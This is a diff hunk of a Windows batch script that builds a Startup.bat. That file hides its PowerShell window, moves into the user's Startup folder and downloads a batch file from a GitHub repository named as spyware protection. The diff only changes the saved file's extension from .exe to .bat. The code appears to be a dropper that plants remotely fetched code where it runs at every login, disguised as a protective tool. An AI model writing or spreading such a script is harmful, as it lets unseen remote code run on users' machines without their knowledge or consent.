@@ -90,7 +90,7 @@ CD /D "%~dp0"
 echo powershell -WindowStyle Hidden -Command "& {}" >Startup.bat
 echo @echo off >>Startup.bat
 echo cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup >>Startup.bat
-echo powershell.exe Invoke-WebRequest -Uri "https://github.com/rrpt66/Apill-fuse/raw/main/Apill-fuse-Protect-against-spyware.bat" -OutFile "Apill-fuse-Protect-against-spyware.exe" >>Startup.bat
+echo powershell.exe Invoke-WebRequest -Uri "https://github.com/rrpt66/Apill-fuse/raw/main/Apill-fuse-Protect-against-spyware.bat" -OutFile "Apill-fuse-Protect-against-spyware.bat" >>Startup.bat
 echo timeout 7 >>Startup.bat
 echo exit >>Startup.bat
 move Startup.bat %temp%
